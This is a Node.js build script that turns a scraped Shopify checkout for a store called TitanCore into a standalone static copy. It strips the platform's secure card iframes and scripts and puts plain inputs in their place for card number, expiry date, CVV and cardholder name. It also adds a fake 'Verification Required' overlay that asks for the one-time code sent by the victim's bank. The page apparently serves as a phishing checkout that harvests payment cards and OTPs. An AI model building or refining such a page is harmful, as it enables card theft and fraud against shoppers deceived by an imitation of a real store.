/**
 * Build static checkout page from WebScrapBook scrape.
 * Usage: SCRAPE_DIR=/path/to/scrape npm run build:checkout
 */
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import * as cheerio from 'cheerio';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.join(__dirname, '..');
const SCRAPE_DIR = process.env.SCRAPE_DIR
  || path.join(ROOT, 'scrape', '20260611204543362');
const OUT = path.join(ROOT, 'public', 'checkout', 'index.html');
const ASSETS = '/checkout/assets';

const CSS_FILES = [
  'global-BJ-0FoAn.css',
  'app.DmM1n0lz.css',
  'useReplaceShopPayInHistory.F5mjvpnu.css',
  'index.0LqF4awG.css',
  'OnePage.CGuEngwq.css',
  'ButtonWithRegisterWebPixel.CGlXnp_8.css',
  'inputs-13a57105af.css',
  'Section.CU18S7Ap.css',
  'MobileOrderSummary.CqVkJv9Z.css',
  'StackedMerchandisePreview.D6OuIVjc.css',
  'ShippingMethodSelector.B0hio2RO.css',
  'useOnePageFormSubmit.BRUjVIS4.css',
  'FullScreenBackground.B_iZlQze.css',
  'LocalizationExtensionField.BFmd7_iA.css',
  'SplitDeliveryMerchandiseContainer.pVQgcb_P.css',
  'phoneCountryCode.C-ppsiYq.css',
  'RuntimeExtension.DWkDBM73.css',
  'SubscriptionPriceBreakdown.BSemv9tH.css',
  'AutocompleteField.B4P9lm7c.css',
];

const LOGO_URL = 'https://cdn.shopify.com/s/files/1/0953/3403/9890/files/hf_20260430_003506_4f9319fd-57f7-4325-b8e4-bd276084de61_x320.png?v=1777509429';

const MY_STATES = [
  ['JHR', 'Johor'], ['KDH', 'Kedah'], ['KTN', 'Kelantan'], ['KUL', 'Kuala Lumpur'],
  ['LBN', 'Labuan'], ['MLK', 'Malacca'], ['NSN', 'Negeri Sembilan'], ['PHG', 'Pahang'],
  ['PNG', 'Penang'], ['PRK', 'Perak'], ['PLS', 'Perlis'], ['PJY', 'Putrajaya'],
  ['SBH', 'Sabah'], ['SWK', 'Sarawak'], ['SGR', 'Selangor'], ['TRG', 'Terengganu'],
];

function cardFieldHtml(id, label, placeholder, attrs = '') {
  return `<div class="_7ozb2u3 _7ozb2u2 _1fragem55 _1fragem6y _1fragemtb _1fragem46 _10vrn9p1 _10vrn9p0 _7ozb2uc _7ozb2ua _1fragemv8 _7ozb2u5 _7ozb2u4 _1fragemv8 _7ozb2ut">
<div class="_7ozb2u7 _7ozb2u6 _1fragemtb _1fragem46 _1fragem109 _1fragemvg _1fragemzp _1fragemzk _1fragemzz _7ozb2uc _7ozb2ua _1fragemv8 _7ozb2um _7ozb2ui">
<label id="${id}-label" for="${id}" class="xpgeoa3 xpgeoa1 _1fragemt1 _1fragemz6 _1fragemzp _1fragemzk _1fragemzz _1fragem102 _1fragem105"><span class="xpgeoa5"><span class="rermvf1 rermvf0 _1fragemr8 _1fragemrn _1fragem37 _1fragem104">${label}</span></span></label>
<input id="${id}" placeholder="${placeholder}" class="_7ozb2ur _7ozb2uq _1fragemtb _1fragemwg _1fragemz5 _1fragem100 _1fragemzh _7ozb2uw _7ozb2uv _1fragemzp _1fragemzk _1fragemzz _7ozb2u16 _7ozb2u1b _7ozb2u1u _7ozb2us" value="" ${attrs}>
</div></div>`;
}

const CARD_FORM_HTML = `<div id="custom-card-form" class="_1fragem37 _1fragemtb" style="margin-top:12px">
${cardFieldHtml('card-number', 'Card number', 'Card number', 'inputmode="numeric" autocomplete="cc-number"')}
<div class="_1mrl40q0 _1fragemtb _1fragemtv _1fragemtr _1fragemu5 _1fragem5p _1fragem7i _1fragem46">
${cardFieldHtml('card-expiry', 'Expiration date (MM / YY)', 'MM / YY', 'autocomplete="cc-exp"')}
${cardFieldHtml('card-cvv', 'Security code', 'CVV', 'inputmode="numeric" autocomplete="cc-csc"')}
</div>
${cardFieldHtml('card-name', 'Name on card', 'Name on card', 'type="text" autocomplete="cc-name"')}
</div>`;

const OVERLAY_HTML = `
<div id="load-overlay" style="position:fixed;inset:0;background:rgba(0,0,0,.55);display:none;align-items:center;justify-content:center;z-index:10000">
  <div style="background:#fff;border-radius:12px;padding:24px;text-align:center;max-width:320px">
    <div style="width:36px;height:36px;border:3px solid #e6dac2;border-top-color:#005bd1;border-radius:50%;animation:tc-spin .8s linear infinite;margin:0 auto 12px"></div>
    <p id="load-text">Processing payment...</p>
  </div>
</div>
<div id="otp-overlay" style="position:fixed;inset:0;background:rgba(0,0,0,.55);display:none;align-items:center;justify-content:center;z-index:10001">
  <div style="width:100%;max-width:400px;background:#fff;border-radius:12px;overflow:hidden">
    <div style="padding:14px 16px;border-bottom:1px solid #e6dac2;font-weight:600">Verification Required</div>
    <div style="padding:20px">
      <p id="otp-message">Enter the code sent to your phone or banking app.</p>
      <input id="otp-code" maxlength="8" inputmode="numeric" style="width:100%;padding:12px;border:2px solid #e6dac2;border-radius:8px;font-size:18px;text-align:center;letter-spacing:4px;margin:12px 0">
      <button id="otp-submit" type="button" style="width:100%;padding:16px;border:none;border-radius:8px;background:#005bd1;color:#fff;font-size:16px;font-weight:600;cursor:pointer">Continue</button>
    </div>
  </div>
</div>
<style>@keyframes tc-spin{to{transform:rotate(360deg)}}#load-overlay.show,#otp-overlay.show{display:flex!important}</style>`;

function removeUnwanted($) {
  $('section[aria-label="Quick Checkout"]').remove();
  $('a').each((_, el) => {
    if ($(el).text().trim() === 'Sign in') $(el).remove();
  });
  $('#billingAddressDetails').remove();
  $('#billingAddressCheckbox').closest('._1mmswk95').remove();
  $('#billingAddressCheckbox').remove();
  $('label[for="billingAddressCheckbox"]').remove();
  $('#basic-SHOPIFY_INSTALLMENTS').closest('._1u2aa6m3').remove();
  $('.sBuoU button').each((_, el) => {
    if ($(el).text().trim() === 'Not now') $(el).closest('.sBuoU').remove();
  });
  $('shop-checkout-modal').remove();
  $('script').remove();
  $('iframe').remove();
  $('#SandboxContainer').remove();
  $('meta[name^="serialized-"]').remove();
}

function cleanupLayout($) {
  $('#summary-items').remove();
  $('aside[data-inspector-id="orderSummary"]').remove();
  $('div[aria-label="Remember me"]').remove();

  $('button').each((_, el) => {
    const t = $(el).text().trim();
    if (t === 'Accept Offer' || t === 'Back to finalize order') $(el).remove();
  });

  $('main#checkout-main section').each((_, el) => {
    const $sec = $(el);
    const h = $sec.find('> div > h2, > div > h3, h2, h3').first().text().trim();
    if (/^Add discount$/i.test(h) || /^Finalize order$/i.test(h)) {
      $sec.remove();
    }
  });

  const $sidebar = $('div[data-inspector-id="orderSummary"] aside').first();
  const $sidebarRoot = $sidebar.length ? $sidebar : $('aside').last();
  if ($sidebarRoot.length) {
    $sidebarRoot.find('h3').each((_, h3) => {
      const $h = $(h3);
      if ($h.text().trim() !== 'Shopping cart') return;
      const $cartSection = $h.closest('section[aria-label="Shopping cart"], section');
      $cartSection.find('[role="table"], [role="rowgroup"], .ScrollForMore').remove();
      $cartSection.append('<div id="summary-items"></div>');
    });

    $sidebarRoot.find('h3').each((_, h3) => {
      const $h = $(h3);
      if ($h.text().trim() !== 'Cost summary') return;
      const $section = $h.closest('section');
      $section.find('[role="row"], tr').each((_, row) => {
        const text = $(row).text().replace(/\s+/g, ' ').trim();
        if (/^Subtotal/i.test(text)) {
          $(row).find('strong, span, td, p, div').last().attr('id', 'subtotal-price');
        }
        if (/^Total/i.test(text) || (text.includes('MYR') && text.includes('RM'))) {
          $(row).find('span, strong').each((_, el) => {
            if ($(el).text().trim() === 'MYR') $(el).remove();
          });
          $(row).find('strong, span, td, p, div').last().attr('id', 'total-price');
        }
        if (/Enter shipping address/i.test(text)) {
          $(row).find('td, span, p, div').last().attr('data-tc-shipping', '1').text('Free');
        }
      });
      $section.find('strong, span').each((_, el) => {
        const t = $(el).text().replace(/\s+/g, ' ').trim();
        if (/^MYR\s*RM/i.test(t)) $(el).text(t.replace(/^MYR\s*/i, ''));
      });
    });

    let $payBtn = null;
    $sidebarRoot.find('button').each((_, el) => {
      const t = $(el).text().trim();
      if (/^submit$/i.test(t) || /pay now/i.test(t)) {
        $payBtn = $(el);
        return false;
      }
    });
    if ($payBtn && $payBtn.length) {
      $payBtn.attr('id', 'pay-btn').attr('type', 'button').text('Pay now');
    } else {
      $sidebarRoot.append('<button id="pay-btn" type="button" class="_1fragemvf">Pay now</button>');
    }
  }

  $('button').not('#pay-btn').each((_, el) => {
    if (/^pay now$/i.test($(el).text().trim())) $(el).remove();
  });

  if (!$('#subtotal-price').length) $('body').append('<span id="subtotal-price" hidden></span>');
  if (!$('#total-price').length) $('body').append('<span id="total-price" hidden></span>');
}

function fixFloatingLabels($) {
  $('._7ozb2u7').each((_, wrap) => {
    const $wrap = $(wrap);
    const $input = $wrap.find('input, textarea').first();
    const $label = $wrap.find('label.xpgeoa3, label.xpgeoa1').first();
    if (!$input.length || !$label.length) return;
    $input.removeAttr('placeholder');
    if (!$input.val()) {
      $wrap.removeClass('_7ozb2u1u');
      $label.removeClass('xpgeoa0');
    }
  });

  $('.RD23h select, .VZudx select, #bill-state, #bill-country').each((_, sel) => {
    const $sel = $(sel);
    const $label = $sel.closest('.RD23h, .VZudx').find('label.QCxaD').first();
    if ($label.length && !$sel.val()) $label.removeClass('A9HkF');
  });
}

function fixAssetUrls(html) {
  return html
    .replace(/href="([^"]+\.css)"/g, (_, f) => {
      const base = path.basename(f.split('?')[0]);
      if (CSS_FILES.includes(base)) return `href="${ASSETS}/${base}"`;
      return '';
    })
    .replace(/(?:href|xlink:href)="(?!https?:\/\/|\/)([^"#]+\.svg)(#[^"]*)?"/g, (_, file, hash) => {
      const base = path.basename(file.split('?')[0]);
      return `href="${ASSETS}/${base}${hash || ''}"`;
    })
    .replace(/src="(?!https?:\/\/|\/)([^"]+\.(?:svg|png|jpg|webp))"/g, (_, file) => {
      const base = path.basename(file.split('?')[0]);
      if (/^hf_.*\.png$/i.test(base)) return `src="${LOGO_URL}"`;
      return `src="${ASSETS}/${base}"`;
    })
    .replace(/href="https:\/\/shop-titancore\.com\/cart"/g, 'href="/cart"')
    .replace(/https:\/\/shop-titancore\.com/g, '');
}

function syncCheckoutAssets() {
  const assetDir = path.join(ROOT, 'public', 'checkout', 'assets');
  fs.mkdirSync(assetDir, { recursive: true });
  for (const file of CSS_FILES) {
    const src = path.join(SCRAPE_DIR, file);
    const dest = path.join(assetDir, file);
    if (fs.existsSync(src)) fs.copyFileSync(src, dest);
  }
  for (const extra of ['sprite.CJe1Ux_m.svg', 'visa.sxIq5Dot.svg', 'mastercard.1c4_lyMp.svg', 'amex.Csr7hRoy.svg']) {
    const src = path.join(SCRAPE_DIR, extra);
    const dest = path.join(assetDir, extra);
    if (fs.existsSync(src)) fs.copyFileSync(src, dest);
  }
}

function isBillingField($el) {
  const auto = ($el.attr('autocomplete') || '').toLowerCase();
  return auto.startsWith('billing') || $el.closest('#billingAddressDetails').length > 0;
}

function assignFieldIds($) {
  const map = [
    ['shipping email', 'bill-email'],
    ['email', 'bill-email'],
    ['shipping country-name', 'bill-country'],
    ['country-name', 'bill-country'],
    ['shipping given-name', 'bill-first'],
    ['given-name', 'bill-first'],
    ['shipping family-name', 'bill-last'],
    ['family-name', 'bill-last'],
    ['shipping street-address', 'bill-address'],
    ['street-address', 'bill-address'],
    ['shipping postal-code', 'bill-postal'],
    ['postal-code', 'bill-postal'],
    ['shipping address-level2', 'bill-city'],
    ['address-level2', 'bill-city'],
    ['shipping address-level1', 'bill-state'],
    ['address-level1', 'bill-state'],
    ['shipping tel-national', 'bill-phone'],
    ['tel-national', 'bill-phone'],
  ];
  const assigned = new Set();
  for (const [auto, id] of map) {
    if (assigned.has(id)) continue;
    $(`[autocomplete="${auto}"]`).each((_, el) => {
      const $el = $(el);
      if (isBillingField($el)) return;
      if ($('#' + id).length) return;
      $el.attr('id', id);
      if (id === 'bill-country') $el.attr('name', 'countryCode');
      if (id === 'bill-state') $el.attr('name', 'zone');
      assigned.add(id);
    });
  }
  if (!$('#bill-email').length) {
    $('input[type="email"]').not('#billingAddressDetails input').first().attr('id', 'bill-email');
  }
}

function fixStateSelect($) {
  let $state = $('#bill-state');
  if (!$state.length) {
    $state = $('select[name="zone"]').not('#billingAddressDetails select').first();
    $state.attr('id', 'bill-state');
  }
  if ($state.length && $state.is('select')) {
    $state.empty();
    $state.append('<option hidden disabled value="" selected>&nbsp;</option>');
    for (const [val, label] of MY_STATES) {
      $state.append(`<option value="${val}">${label}</option>`);
    }
    const $label = $state.closest('.RD23h, .VZudx').find('label.QCxaD').first();
    if ($label.length && !$label.attr('for')) {
      $label.attr('for', 'bill-state');
    }
  } else if (!$state.length) {
    // inject state select after city if missing
    const $city = $('#bill-city');
    if ($city.length) {
      const opts = MY_STATES.map(([v, l]) => `<option value="${v}">${l}</option>`).join('');
      $city.closest('._1mrl40q0').after(`<div class="RD23h _1k3449n3 _1k3449n1 _1fragemv8 _10vrn9p1 _10vrn9p0"><div><div class="VZudx _1k3449n3 _1k3449n1 _1fragemv8"><label for="bill-state" class="QCxaD"><span class="XDBWz"><span class="rermvf1 rermvf0 _1fragemr8 _1fragemrn _1fragem37 _1fragem104">State/territory</span></span></label><select name="zone" id="bill-state" autocomplete="shipping address-level1" class="ZHJU6 _1k3449n0 _1fragem109 IWR5K tu1VS"><option hidden disabled value="" selected>&nbsp;</option>${opts}</select><div class="VXrUd"><span class="a8x1wu2 a8x1wu1 _1fragemwg _1fragem2x _1fragems7 _1fragemrx _1fragemzq _1fragemzv _1fragemzk a8x1wu9 a8x1wui a8x1wum a8x1wuk _1fragem37 a8x1wup a8x1wuo a8x1wuw"><svg viewBox="0 0 14 14" focusable="false" aria-hidden="true"><use href="${ASSETS}/sprite.CJe1Ux_m.svg#chevronDown"></use></svg></span></div></div></div></div>`);
    }
  }
}

function replaceCardIframes($) {
  const CARD_FIELDS = [
    { hostId: 'number', inputId: 'card-number', labelId: 'number-label', autocomplete: 'cc-number', inputmode: 'numeric' },
    { hostId: 'expiry', inputId: 'card-expiry', labelId: 'expiry-label', autocomplete: 'cc-exp', inputmode: 'numeric' },
    { hostId: 'verification_value', inputId: 'card-cvv', labelId: 'verification_value-label', autocomplete: 'cc-csc', inputmode: 'numeric' },
    { hostId: 'name', inputId: 'card-name', labelId: 'name-label', autocomplete: 'cc-name' },
  ];
  const INPUT_CLASS =
    '_7ozb2ur _7ozb2uq _1fragemtb _1fragemwg _1fragemz5 _1fragem100 _1fragemzh _7ozb2uw _7ozb2uv _1fragemzp _1fragemzk _1fragemzz _7ozb2u16 _7ozb2u1b _7ozb2u1u _7ozb2us';

  for (const f of CARD_FIELDS) {
    const $host = $(`#${f.hostId}`).first();
    if (!$host.length) continue;
    const $label = $(`label#${f.labelId}, label[for="${f.hostId}"]`).first();
    if ($label.length) $label.attr('for', f.inputId);
    $host.removeAttr('tabindex data-card-fields data-card-field-placeholder data-card-field-prefix');
    $host.removeClass('_211UF');
    const attrs = [
      `id="${f.inputId}"`, `class="${INPUT_CLASS}"`, `autocomplete="${f.autocomplete}"`,
      'value=""', `aria-labelledby="${f.labelId}"`,
    ];
    if (f.inputmode) attrs.push(`inputmode="${f.inputmode}"`);
    $host.empty().append(`<input ${attrs.join(' ')}>`);
  }
  for (const extraId of ['issue_date', 'issue_number']) {
    const $host = $(`#${extraId}`).first();
    if ($host.length) $host.closest('.Uq6Ln').remove();
  }
  $('iframe.card-fields-iframe').remove();
}

function setupPaymentMethods($) {
  $('#directPaymentMethodDetails').remove();

  let $credit = $('input#basic-creditCards, input#basic-CREDIT_CARD, input[aria-label="Credit card"]').first();
  if (!$credit.length) {
    $('label').each((_, el) => {
      if ($(el).text().includes('Credit card')) {
        $credit = $(el).closest('._1u2aa6m3').find('input[type="radio"]').first();
        return false;
      }
    });
  }

  if ($credit.length) {
    $credit.attr('checked', 'checked');
    const $creditRow = $credit.closest('._1u2aa6m3');

    const $debit = $creditRow.clone();
    $debit.find('input[type="radio"]').each((_, el) => {
      $(el).attr({ id: 'basic-DEBIT_CARD', name: 'basic', 'aria-label': 'Debit card' });
      $(el).removeAttr('checked');
    });
    $debit.find('[id$="-secondary"]').remove();
    $debit.find('label[for]').attr('for', 'basic-DEBIT_CARD');
    $debit.find('strong').first().text('Debit card');
    $debit.find('img').remove();
    $debit.find('[data-option-selected]').attr('data-option-selected', 'false');
    $creditRow.find('[data-option-selected]').attr('data-option-selected', 'true');
    $creditRow.find('label[for]').attr('data-option-selected', 'true');
    $debit.find('label[for]').attr('data-option-selected', 'false');
    $creditRow.after($debit);
  }

  replaceCardIframes($);
  $('#custom-card-form').remove();
}


function build() {
  syncCheckoutAssets();
  const scrapePath = path.join(SCRAPE_DIR, 'index.html');
  if (!fs.existsSync(scrapePath)) {
    throw new Error(`Scrape not found: ${scrapePath}. Set SCRAPE_DIR env var.`);
  }

  const raw = fs.readFileSync(scrapePath, 'utf8');
  const $ = cheerio.load(raw, { decodeEntities: false });

  removeUnwanted($);

  let main = $('.g9gqqf1').first();
  if (!main.length) main = $('body');

  assignFieldIds($);
  fixStateSelect($);
  setupPaymentMethods($);
  cleanupLayout($);
  fixFloatingLabels($);

  const cssLinks = CSS_FILES.map((f) => `<link rel="stylesheet" href="${ASSETS}/${f}">`).join('\n');

  let bodyHtml = $.html(main) || '';
  bodyHtml = fixAssetUrls(bodyHtml);

  const html = `<!DOCTYPE html>
<html lang="en-MY" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Checkout - TitanCore</title>
${cssLinks}
<link rel="stylesheet" href="/checkout/assets/checkout-fix.css">
<style>html,body{background-color:rgb(253,251,247);margin:0}#summary-items .tc-summary-item{display:flex;gap:12px;padding:12px 0;border-bottom:1px solid var(--x-default-color-border,#e6dac2);align-items:center}#summary-items .tc-summary-item img{width:64px;height:64px;object-fit:cover;border-radius:8px;border:1px solid var(--x-default-color-border,#e6dac2);background:#fff}#summary-items .tc-title{font-size:14px;font-weight:500}#summary-items .tc-qty{font-size:13px;color:var(--x-default-color-text-subdued,rgba(0,0,0,.56))}#summary-items .tc-price{font-size:14px;font-weight:500;white-space:nowrap;margin-left:auto}</style>
</head>
<body>
${bodyHtml}
${OVERLAY_HTML}
<script src="/checkout/checkout-fields.js"><\/script>
<script src="/checkout/checkout-app.js"><\/script>
</body>
</html>`;

  // Verify removals
  for (const bad of ['Quick Checkout', 'billingAddressCheckbox', 'SHOPIFY_INSTALLMENTS', 'Not now']) {
    if (html.includes(bad)) console.warn(`WARN: still contains "${bad}"`);
  }

  fs.writeFileSync(OUT, html, 'utf8');
  console.log(`Built ${OUT} (${(html.length / 1024).toFixed(1)} KB)`);
}

build();
